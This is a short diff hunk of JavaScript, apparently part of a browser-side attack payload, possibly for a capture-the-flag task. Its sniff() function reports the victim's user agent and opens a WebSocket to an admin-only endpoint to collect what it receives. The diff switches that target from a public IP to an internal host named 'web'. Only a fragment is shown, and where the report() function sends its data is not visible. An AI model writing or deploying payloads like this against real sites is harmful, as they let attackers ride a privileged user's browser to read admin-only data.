@@ -26,7 +26,7 @@ function sniff(){
   report("START_SNIF " + navigator.userAgent);
 
   try {
-    const ws_url = "ws://65.109.185.79:8080/admin/ws";
+    const ws_url = "ws://web:8080/admin/ws";
     report("TRY_WS:" + ws_url);
     let ws = new WebSocket(ws_url);
     let received = "";
